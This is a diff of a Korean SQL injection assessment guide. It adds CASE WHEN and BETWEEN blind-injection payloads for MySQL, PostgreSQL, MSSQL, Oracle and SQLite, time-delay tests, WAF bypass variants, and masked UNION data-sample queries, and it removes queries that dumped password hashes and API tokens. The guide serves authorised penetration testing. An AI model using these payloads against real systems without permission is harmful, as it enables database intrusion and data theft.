@@ -1,12 +1,11 @@
 ---
-sidebar_position: 11
+sidebar_position: 20
 title: SQL Injection
 description: 웹 진단 - SQL Injection 컨텍스트 판단, 응답 비교, 페이로드, 우회 노트
-keywords: [SQL Injection, SQLi, Error-based, Boolean, Time-based, Union-based, 입력값 검증, OWASP A05]
+keywords: [SQL Injection, SQLi, Error-based, Boolean, Time-based, Union-based, CASE WHEN, BETWEEN, MySQL, PostgreSQL, MSSQL, Oracle, SQLite, 입력값 검증, OWASP A05]
 draft: false
+toc_max_heading_level: 3
 ---
-
-# SQL 인젝션 (SQL Injection)
 
 ## 점검 목적
 
@@ -27,7 +26,7 @@ draft: false
 
 ## 진단 절차
 
-### Step 1. 진입점 식별
+#### Step 1. 진입점 식별
 
 DB 조회 조건, 정렬 조건, 저장 후 재조회되는 값부터 우선 본다.
 
@@ -39,7 +38,7 @@ DB 조회 조건, 정렬 조건, 저장 후 재조회되는 값부터 우선 본
 - Cookie/Header: `lang`, `tenant`, `X-Forwarded-For`, `User-Agent`
 - 저장값: 회원명, 부서명, 게시글 제목, 파일명, 관리자 메모
 
-### Step 2. SQLi 진단 루틴
+#### Step 2. SQLi 진단 루틴
 
 Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/False 비교 → 지연 비교 → 컨텍스트 전환** 순서로 좁힌다.
 
@@ -91,7 +90,7 @@ Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/F
 | WAF/필터 응답으로 차단 | 입력 전처리 또는 WAF | 인코딩, 주석, 대소문자, 연산자 우회 확인 |
 | 파라미터가 서버 응답에 영향 없음 | 미사용 파라미터 가능성 | 실제 요청 body, hidden parameter, 다른 API 확인 |
 
-### Step 3. 컨텍스트별 빠른 선택
+#### Step 3. 컨텍스트별 빠른 선택
 
 먼저 파라미터가 SQL에서 어떤 자리에 들어갈지 가정하고 payload를 고른다.
 
@@ -107,19 +106,21 @@ Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/F
 | JSON 값 | `{"id":"1 AND 1=1"}`, `{"id":1}` | 문자열/숫자 타입 강제 여부 |
 | Cookie/Header | `'`, `')`, `' AND '1'='1` | 즉시 응답보다 로그/관리자 화면 영향 |
 
-### Step 4. DBMS 식별
+#### Step 4. DBMS 식별
 
 오류 메시지, 함수명, 지연 함수 반응으로 DBMS를 좁힌다.
 
-| DBMS | 오류/버전 확인 | 지연 확인 |
-| :--- | :--- | :--- |
-| MySQL/MariaDB | `@@version`, `version()`, `database()` | `SLEEP(3)` |
-| PostgreSQL | `version()`, `current_database()` | `pg_sleep(3)` |
-| MSSQL | `@@version`, `DB_NAME()` | `WAITFOR DELAY '0:0:3'` |
-| Oracle | `banner FROM v$version`, `USER` | `DBMS_LOCK.SLEEP(3)` |
-| SQLite | `sqlite_version()` | 별도 sleep 함수가 없는 경우가 많음 |
+| DBMS | 식별·현재 DB | 문자열 조건 함수 | 지연 확인 |
+| :--- | :--- | :--- | :--- |
+| MySQL/MariaDB | `VERSION()`, `DATABASE()` | `SUBSTRING()`, `ASCII()`, `CHAR_LENGTH()` | `SLEEP(3)` |
+| PostgreSQL | `VERSION()`, `CURRENT_DATABASE()` | `SUBSTRING()`, `ASCII()`, `LENGTH()` | `pg_sleep(3)` |
+| MSSQL | `@@VERSION`, `DB_NAME()` | `SUBSTRING()`, `ASCII()`/`UNICODE()`, `LEN()` | `WAITFOR DELAY '0:0:3'` 문장 |
+| Oracle | `banner FROM v$version`, `SYS_CONTEXT('USERENV','DB_NAME')` | `SUBSTR()`, `ASCII()`, `LENGTH()` | 패키지 실행 권한과 SQL/PLSQL 문맥에 따라 다름 |
+| SQLite | `SQLITE_VERSION()` | `SUBSTR()`, `UNICODE()`, `LENGTH()` | 기본 내장 sleep 함수 없음 |
 
-### Step 5. 영향 확인
+`CASE WHEN ... THEN ... ELSE ... END`와 `BETWEEN ... AND ...`은 위 DBMS에서 공통으로 쓸 수 있지만, 현재 DB명과 문자열 처리 함수는 다르다. MSSQL의 `WAITFOR`와 Oracle의 `DBMS_LOCK.SLEEP`은 값(expression)이 아니라 문장 또는 프로시저이므로 `CASE`의 `THEN` 반환값 자리에 그대로 넣지 않는다.
+
+#### Step 5. 영향 확인
 
 취약 확정에는 “대량 추출”보다 **최소 증거**가 좋다.
 
@@ -136,7 +137,7 @@ Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/F
 
 아래 payload는 컨텍스트가 어느 정도 잡혔을 때 사용한다. 운영 환경에서는 지연 시간은 짧게, 반복 횟수는 필요한 만큼만 잡는다.
 
-### 숫자형 / 문자열 조건
+### 1. 숫자형 / 문자열 조건
 
 숫자형 파라미터는 quote 없는 payload를 먼저 본다.
 
@@ -162,7 +163,7 @@ test') AND ('1'='2
 
 응답이 빈 목록으로 바뀌는지, `totalCount`, `pageInfo`, `message`, `data.length`가 달라지는지 본다.
 
-### 검색 / LIKE 컨텍스트
+### 2. 검색 / LIKE 컨텍스트
 
 검색어는 보통 `LIKE '%<INPUT>%'` 형태라 wildcard와 quote 위치가 중요하다.
 
@@ -176,7 +177,7 @@ test%' OR '1'='1
 
 검색 결과가 너무 많아지면 오탐처럼 보일 수 있다. baseline 검색어를 고정하고 조건식만 바꿔 비교한다.
 
-### 정렬 / ORDER BY 컨텍스트
+### 3. 정렬 / ORDER BY 컨텍스트
 
 `sort`, `order`, `orderBy`는 보통 `ORDER BY <INPUT>` 자리에 들어간다. quote payload보다 먼저 **서버 정렬이 실제로 바뀌는지**와 **SQL expression이 실행되는지**를 본다.
 
@@ -190,7 +191,7 @@ test%' OR '1'='1
 
 `name`, `id`는 예시다. 실제 화면에 있는 `title`, `seq`, `createdAt` 같은 정렬 가능 컬럼으로 바꿔서 본다. 프론트 정렬, 서버 allowlist 정렬, DB 정렬을 구분하려면 같은 요청을 Raw response 기준으로 비교한다.
 
-### JSON Body 컨텍스트
+### 4. JSON Body 컨텍스트
 
 JSON은 먼저 서버가 타입을 강제하는지 본다. 숫자 필드가 문자열도 받으면 SQL 조건식이 문자열로 전달될 여지가 있다.
 
@@ -210,7 +211,7 @@ JSON은 먼저 서버가 타입을 강제하는지 본다. 숫자 필드가 문�
 
 JSON 파싱 단계에서 막히는 오류와 DB Query 단계에서 나는 오류를 구분한다. `400 Bad Request`만 나오면 SQLi보다 타입/스키마 검증에 걸렸을 가능성이 높다.
 
-### 로그인 우회
+### 5. 로그인 우회
 
 로그인은 어느 파라미터 뒤에 `AND password = ...`가 붙는지 먼저 가정한다.
 
@@ -241,7 +242,7 @@ id=admin&pw=test%27%20OR%20%271%27%3d%271
 
 판정은 “로그인 성공”만 보지 말고 세션 발급, 사용자 식별값, 권한 화면 접근까지 확인한다.
 
-### Error-based
+### 6. Error-based
 
 오류가 응답에 노출될 때만 사용한다. DBMS가 다르면 함수가 바로 달라진다.
 
@@ -263,7 +264,7 @@ id=admin&pw=test%27%20OR%20%271%27%3d%271
 
 오류 메시지가 화면에 그대로 나오면 취약 확정에 가깝다. 운영에서는 오류 기반으로 DB명/버전 정도만 확인하고 멈추는 편이 안전하다.
 
-### Union-based
+### 7. Union-based
 
 화면이나 API 응답에 쿼리 결과가 출력될 때만 유효하다.
 
@@ -284,7 +285,7 @@ id=admin&pw=test%27%20OR%20%271%27%3d%271
 
 컬럼 수가 맞아도 데이터 타입이 안 맞으면 실패한다. 숫자/문자/날짜 컬럼이 섞인 화면에서는 `NULL`로 맞춘 뒤 출력 위치에만 문자열을 넣는다.
 
-### Boolean-based Blind
+### 8. Boolean-based Blind
 
 응답 내용이 달라지는 필드를 먼저 정한다.
 
@@ -308,7 +309,218 @@ redirect 여부
 
 캐시가 섞이면 같은 payload를 반복해도 응답이 흔들린다. `Cache-Control: no-cache`를 붙이거나 의미 없는 파라미터를 추가해 baseline을 다시 잡는다.
 
-### Time-based Blind
+### 9. `CASE WHEN ... THEN` 조건 분기
+
+`CASE`는 별도의 SQL Injection 유형이 아니라 **조건에 따라 하나의 값을 반환하는 식(expression)** 이다. 일반 `AND 1=1` 비교가 응답에 잘 드러나지 않거나, 입력값이 `ORDER BY` 같은 식 자리에 들어갈 때 True/False 차이를 만들기 좋다.
+
+```sql
+-- searched CASE: Injection에서 주로 쓰는 형태
+CASE WHEN <조건> THEN <참일 때 값> ELSE <거짓일 때 값> END
+
+-- simple CASE: 한 값을 여러 후보와 비교할 때 사용
+CASE <값> WHEN <비교값> THEN <결과> ELSE <기본값> END
+```
+
+`CASE` 자체는 Boolean 조건이 아니므로, 숫자 `1`/`0` 또는 문자열 `A`/`B`를 반환한 뒤 바깥에서 다시 비교한다.
+
+#### 응답 기반 True/False
+
+**이럴 때 사용**: `WHERE`, `HAVING`, scalar subquery처럼 식을 받을 수 있고, 참일 때 row가 남고 거짓일 때 사라지는 지점.
+
+**바꿀 값**: `1=1`과 `1=2`만 바꿔 나머지 요청을 동일하게 유지한다.
+
+```sql
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1-- -
+' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=1-- -
+```
+
+문자형 결과가 더 자연스러운 문맥에서는 `THEN`과 `ELSE`를 같은 문자열 타입으로 맞춘다.
+
+```sql
+' AND CASE WHEN (1=1) THEN 'A' ELSE 'B' END='A'-- -
+' AND CASE WHEN (1=2) THEN 'A' ELSE 'B' END='A'-- -
+```
+
+**확인할 것**: HTTP status만 보지 말고 row 수, `totalCount`, 특정 JSON 필드, 메시지, redirect가 두 요청 사이에서 안정적으로 갈리는지 본다.
+
+#### `ORDER BY CASE`
+
+`sort`, `orderBy`처럼 정렬 식만 주입할 수 있을 때는 오류나 본문 제거 대신 **정렬 순서**를 True/False 신호로 쓸 수 있다.
+
+```sql
+CASE WHEN (1=1) THEN name ELSE created_at END
+CASE WHEN (1=2) THEN name ELSE created_at END
+```
+
+요청 파라미터 예시는 다음과 같다.
+
+```text
+sort=CASE WHEN (1=1) THEN name ELSE created_at END
+sort=CASE WHEN (1=2) THEN name ELSE created_at END
+```
+
+`name`, `created_at`은 실제 Query에 존재하는 컬럼으로 바꾼다. 두 컬럼의 데이터 타입이 다르면 DBMS가 암시적 형 변환을 시도하다 오류가 날 수 있으므로, 처음에는 같은 문자형 또는 같은 숫자형 컬럼 두 개를 고른다. 정렬 차이가 눈에 보이도록 값 분포가 다른 컬럼을 선택한다.
+
+#### DBMS별 조건식
+
+아래 예시는 현재 DB명 첫 글자의 문자 코드가 `77`보다 큰지를 확인한다. DB 식별 전에는 함수명을 섞지 말고, Step 4에서 반응한 DBMS의 문법만 사용한다.
+
+```sql
+-- MySQL/MariaDB
+' AND CASE WHEN ASCII(SUBSTRING(DATABASE(),1,1))>77 THEN 1 ELSE 0 END=1-- -
+
+-- PostgreSQL
+' AND CASE WHEN ASCII(SUBSTRING(CURRENT_DATABASE(),1,1))>77 THEN 1 ELSE 0 END=1-- -
+
+-- MSSQL
+' AND CASE WHEN ASCII(SUBSTRING(DB_NAME(),1,1))>77 THEN 1 ELSE 0 END=1-- -
+
+-- Oracle
+' AND CASE WHEN ASCII(SUBSTR(SYS_CONTEXT('USERENV','DB_NAME'),1,1))>77 THEN 1 ELSE 0 END=1-- -
+
+-- SQLite: DB 파일명 대신 내장 버전 문자열로 문법 반응 확인
+' AND CASE WHEN UNICODE(SUBSTR(SQLITE_VERSION(),1,1))>51 THEN 1 ELSE 0 END=1-- -
+```
+
+| DBMS | 조건 대상 예시 | 위치 추출 | 문자 코드 | 조건부 지연에서의 차이 |
+| :--- | :--- | :--- | :--- | :--- |
+| MySQL/MariaDB | `DATABASE()` | `SUBSTRING(value,pos,1)` | `ASCII()` | `SLEEP()`이 값을 반환하므로 `CASE` 결과 식에 배치 가능 |
+| PostgreSQL | `CURRENT_DATABASE()` | `SUBSTRING(value,pos,1)` | `ASCII()` | `pg_sleep()`은 `void`를 반환하므로 보통 별도 `SELECT CASE` 문맥 사용 |
+| MSSQL | `DB_NAME()` | `SUBSTRING(value,pos,1)` | `ASCII()`/`UNICODE()` | `WAITFOR`는 문장이므로 `CASE THEN`에 넣지 않고 stacked `IF` 사용 |
+| Oracle | `SYS_CONTEXT('USERENV','DB_NAME')` | `SUBSTR(value,pos,1)` | `ASCII()` | `DBMS_LOCK.SLEEP`은 프로시저이므로 단순 SQL `CASE` 반환값으로 사용 불가 |
+| SQLite | `SQLITE_VERSION()` 또는 scalar subquery | `SUBSTR(value,pos,1)` | `UNICODE()` | 기본 내장 지연 함수가 없어 응답·정렬 차이를 우선 사용 |
+
+MySQL/MariaDB는 식 안에서 조건부 지연을 만들 수 있다. 먼저 3초 이하의 짧은 값으로 시작하고, True/False 쌍을 반복 비교한다.
+
+```sql
+' AND CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END=0-- -
+' AND CASE WHEN (1=2) THEN SLEEP(3) ELSE 0 END=0-- -
+```
+
+PostgreSQL과 MSSQL은 같은 의도를 아래처럼 표현하지만, 둘 다 **stacked query가 허용되는 문맥**이어야 한다.
+
+```sql
+-- PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
+'; SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
+
+-- MSSQL: WAITFOR는 CASE 식이 아니라 IF 뒤의 문장
+'; IF (1=1) WAITFOR DELAY '0:0:3'-- -
+'; IF (1=2) WAITFOR DELAY '0:0:3'-- -
+```
+
+#### 실패 원인
+
+- `THEN`과 `ELSE`의 결과 타입이 호환되지 않으면 조건이 맞아도 형 변환 오류가 날 수 있음
+- `ELSE`를 생략하면 어느 `WHEN`도 참이 아닐 때 `NULL`을 반환해 False 응답과 구분하기 어려움
+- `CASE`는 보통 필요한 분기만 평가하지만, 상수식·집계식·암시적 형 변환이 Query 최적화 단계에서 먼저 평가될 수 있음
+- 따라서 `CASE WHEN <조건> THEN 1/0 ELSE 1 END` 같은 오류 유발식은 조건부 실행을 보장하는 기준 payload로 쓰지 않음
+- `CASE`가 파싱된다는 사실만으로 취약이 확정되지는 않음. 같은 요청에서 True/False 응답 차이까지 재현해야 함
+
+### 10. `BETWEEN` 범위 조건
+
+`BETWEEN`은 값이 범위 안에 있는지 확인하는 조건식이다. 양 끝값을 모두 포함하며, 기본 의미는 `<값> >= <하한> AND <값> <= <상한>`과 같다.
+
+```sql
+-- True
+' AND 1 BETWEEN 1 AND 1-- -
+
+-- False
+' AND 1 BETWEEN 2 AND 3-- -
+```
+
+`=` 필터링을 피하면서 같은 값인지 확인하거나, Blind SQL Injection에서 문자 코드 후보 범위를 절반씩 줄일 때 유용하다. 다만 문법 자체에 `AND`가 필요하므로 `AND` 키워드가 차단된 상황의 우회는 아니다.
+
+#### 최소 진단 쌍
+
+숫자형은 하한과 상한만 바꿔 비교한다.
+
+```sql
+1 AND 7 BETWEEN 7 AND 7
+1 AND 7 BETWEEN 8 AND 9
+```
+
+문자열 비교는 DB collation 영향을 받으므로 취약 여부를 처음 확인할 때만 단순 문자를 쓰고, 실제 범위 추론은 `ASCII()` 또는 `UNICODE()`로 숫자화한다.
+
+```sql
+' AND 'm' BETWEEN 'a' AND 'z'-- -
+' AND 'm' BETWEEN 'n' AND 'z'-- -
+```
+
+#### 범위 분할 추론
+
+Blind 추론은 한 글자씩 모든 값을 대입하기보다 범위를 반으로 나누면 요청 수를 줄일 수 있다. 출력 가능한 ASCII 범위를 `32~126`으로 가정하면 한 위치를 최대 7번 정도 비교해 좁힐 수 있다.
+
+```text
+1. 전체 후보: 32~126
+2. 32~79가 True인지 확인
+3. True면 32~55, False면 80~103처럼 현재 후보 범위를 다시 분할
+4. 마지막 한 값은 BETWEEN <값> AND <값>으로 확정
+```
+
+먼저 길이 범위를 확인한 뒤, 각 위치의 문자 코드 범위를 줄인다.
+
+```sql
+-- 길이가 1~32인지
+' AND <길이_식> BETWEEN 1 AND 32-- -
+
+-- 첫 글자가 출력 가능한 ASCII 범위인지
+' AND <문자코드_식> BETWEEN 32 AND 126-- -
+
+-- 첫 글자 후보를 절반으로 분할
+' AND <문자코드_식> BETWEEN 32 AND 79-- -
+```
+
+#### DBMS별 길이·문자 범위
+
+```sql
+-- MySQL/MariaDB
+' AND CHAR_LENGTH(DATABASE()) BETWEEN 1 AND 32-- -
+' AND ASCII(SUBSTRING(DATABASE(),1,1)) BETWEEN 65 AND 77-- -
+
+-- PostgreSQL
+' AND LENGTH(CURRENT_DATABASE()) BETWEEN 1 AND 32-- -
+' AND ASCII(SUBSTRING(CURRENT_DATABASE(),1,1)) BETWEEN 65 AND 77-- -
+
+-- MSSQL
+' AND LEN(DB_NAME()) BETWEEN 1 AND 32-- -
+' AND ASCII(SUBSTRING(DB_NAME(),1,1)) BETWEEN 65 AND 77-- -
+
+-- Oracle
+' AND LENGTH(SYS_CONTEXT('USERENV','DB_NAME')) BETWEEN 1 AND 32-- -
+' AND ASCII(SUBSTR(SYS_CONTEXT('USERENV','DB_NAME'),1,1)) BETWEEN 65 AND 77-- -
+
+-- SQLite: DB 파일명 조회용 표준 함수가 없어 버전 문자열로 문법 확인
+' AND LENGTH(SQLITE_VERSION()) BETWEEN 1 AND 32-- -
+' AND UNICODE(SUBSTR(SQLITE_VERSION(),1,1)) BETWEEN 48 AND 57-- -
+```
+
+SQLite에서 실제 값 범위를 확인할 때는 `SQLITE_VERSION()`을 대상 scalar subquery로 바꾼다. 예를 들어 허용된 범위 내 테스트 테이블의 단일 값 또는 row count처럼 영향이 낮은 대상을 사용한다.
+
+#### `CASE`와 결합
+
+입력 위치가 Boolean 조건을 직접 받지 않고 숫자 결과만 받는다면 `BETWEEN` 결과를 `CASE`로 `1`/`0`에 매핑한다.
+
+```sql
+-- MSSQL 예시: 현재 DB명 첫 글자가 A~M 범위인지
+' AND CASE
+    WHEN ASCII(SUBSTRING(DB_NAME(),1,1)) BETWEEN 65 AND 77 THEN 1
+    ELSE 0
+  END=1-- -
+```
+
+같은 방식으로 DBMS별 `DATABASE()`, `CURRENT_DATABASE()`, `SYS_CONTEXT()`, `SQLITE_VERSION()` 표현식만 바꾼다.
+
+#### 실패 원인
+
+- 하한과 상한을 뒤집으면 일반 `BETWEEN`은 False가 됨. PostgreSQL의 `BETWEEN SYMMETRIC`은 DBMS 식별이 끝난 뒤에만 사용
+- 대상 값이나 경계값이 `NULL`이면 결과가 True/False가 아니라 Unknown이 될 수 있음
+- 문자열 `BETWEEN`은 대소문자, 언어, accent를 처리하는 collation에 따라 결과가 달라질 수 있으므로 문자 코드 비교를 우선함
+- MySQL/MariaDB는 숫자와 문자열을 섞으면 암시적 형 변환이 개입할 수 있으므로 세 값을 같은 타입으로 맞춤
+- MSSQL에서 Unicode 문자 범위를 볼 때는 `ASCII()` 대신 `UNICODE()`를 사용함
+- 날짜·시간 필터에서는 상한도 포함된다. `2026-07-16 00:00:00`을 상한으로 넣으면 그날의 나머지 시간이 제외될 수 있으므로 baseline 날짜 타입을 먼저 확인함
+
+### 11. Time-based Blind
 
 내용 차이가 없을 때 마지막에 본다. 지연은 짧게 시작하고 baseline 편차가 크면 판단하지 않는다.
 
@@ -328,7 +540,7 @@ redirect 여부
 
 판정은 한 번의 지연이 아니라 **True 지연 / False 비지연 / baseline 정상** 조합이 반복될 때 한다.
 
-### Second-Order / 저장값
+### 12. Second-Order / 저장값
 
 저장 요청에서 아무 반응이 없어도, 저장값이 다른 기능의 SQL 조건으로 재사용될 수 있다.
 
@@ -352,7 +564,7 @@ Host: <TARGET>
 
 ---
 
-## 필터 / WAF 우회 매트릭스
+## 우회 매트릭스
 
 무작정 payload를 늘리지 말고, 차단되는 문자와 변형되는 위치를 먼저 본다.
 
@@ -362,7 +574,7 @@ Host: <TARGET>
 | quote 차단 | 숫자형 조건, hex, 함수 | `1 AND 1=1`, `0x61646d696e` |
 | `AND` / `OR` 차단 | 연산자 대체, 대소문자 | `&&`, `OR` 연산자 대체, `AnD`, `oR` |
 | `UNION` / `SELECT` 차단 | 주석 삽입, 대소문자 | `UN/**/ION SEL/**/ECT`, `UnIoN SeLeCt` |
-| `=` 차단 | `LIKE`, `IN`, 비교 연산 | `'a' LIKE 'a'`, `1 IN (1)`, `2>1` |
+| `=` 차단 | `LIKE`, `IN`, `BETWEEN`, 비교 연산 | `'a' LIKE 'a'`, `1 IN (1)`, `1 BETWEEN 1 AND 1`, `2>1` |
 | `--` 차단 | 다른 주석, 괄호 닫기 | `#`, `/*`, `') OR ('1'='1` |
 | URL decoding 이슈 | 한 번/두 번 인코딩 비교 | `%27`, `%2527`, `%20`, `+` |
 | JSON 타입 검증 | 문자열/숫자 타입 전환 | `"id":"1 OR 1=1"`, `"id":1` |
@@ -484,27 +696,29 @@ MySQL/MariaDB 기준 예시다. DBMS가 다르면 catalog 뷰를 바꿔서 같�
 
 ### 데이터 샘플 확인
 
-데이터 접근 가능성은 실제 샘플로 입증한다. 비밀번호 해시, API token, 개인정보 컬럼도 조회 대상이 될 수 있다.
+데이터 접근 가능성은 제한된 샘플로 입증한다. 먼저 row count, 컬럼 존재, 테스트 계정 또는 마스킹 가능한 식별값처럼 영향이 낮은 증거를 우선한다.
 
 ```sql
 ' UNION SELECT NULL,CONCAT(id,':',email),NULL
   FROM users
-  LIMIT 3-- -
+  WHERE id=<TEST_USER_ID>
+  LIMIT 1-- -
 ```
 
-민감 컬럼 접근 가능성을 보여야 할 때는 샘플 수를 제한한다.
+민감 컬럼 접근 가능성은 원문 덤프보다 컬럼 존재와 길이·마스킹 샘플로 확인한다.
 
 ```sql
-' UNION SELECT NULL,CONCAT(id,':',password_hash),NULL
+' UNION SELECT NULL,CONCAT(id,':',LEFT(email,3),'***'),NULL
   FROM users
   LIMIT 3-- -
 
-' UNION SELECT NULL,CONCAT(user_id,':',api_token),NULL
-  FROM api_tokens
-  LIMIT 3-- -
+' UNION SELECT NULL,CONCAT('password_hash_len=',LENGTH(password_hash)),NULL
+  FROM users
+  WHERE id=<TEST_USER_ID>
+  LIMIT 1-- -
 ```
 
-컬럼명이 다르면 실제 스키마에 맞춰 바꾼다. 대량 조회 전에는 count와 제한 샘플로 먼저 데이터 성격을 확인한다.
+컬럼명이 다르면 실제 스키마에 맞춰 바꾼다. 대량 조회 전에는 count와 제한 샘플로 먼저 데이터 성격을 확인하고, 토큰·비밀번호 해시 원문 조회는 별도 승인 범위로 분리한다.
 
 ### 쓰기 가능성 확인
 
@@ -522,8 +736,22 @@ MySQL/MariaDB 기준 예시다. DBMS가 다르면 catalog 뷰를 바꿔서 같�
 
 ## 참고자료
 
+### 공식 및 테스트 가이드
+
 - [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 - [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
+- [MySQL - Flow Control Functions (`CASE`)](https://dev.mysql.com/doc/refman/8.4/en/flow-control-functions.html)
+- [MySQL - Comparison Functions and Operators (`BETWEEN`)](https://dev.mysql.com/doc/refman/8.4/en/comparison-operators.html)
+- [PostgreSQL - Conditional Expressions (`CASE`)](https://www.postgresql.org/docs/current/functions-conditional.html)
+- [PostgreSQL - Comparison Functions and Operators (`BETWEEN`)](https://www.postgresql.org/docs/current/functions-comparison.html)
+- [Microsoft Learn - `CASE` (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/case-transact-sql)
+- [Microsoft Learn - `BETWEEN` (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/between-transact-sql)
+- [Oracle Database - `CASE` Expressions](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/CASE-Expressions.html)
+- [Oracle Database - `BETWEEN` Condition](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/BETWEEN-Condition.html)
+- [SQLite - SQL Language Expressions (`BETWEEN`, `CASE`)](https://www.sqlite.org/lang_expr.html)
+
+### 커뮤니티 참고 / 도구
+
 - [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 - [sqlmap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 - [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
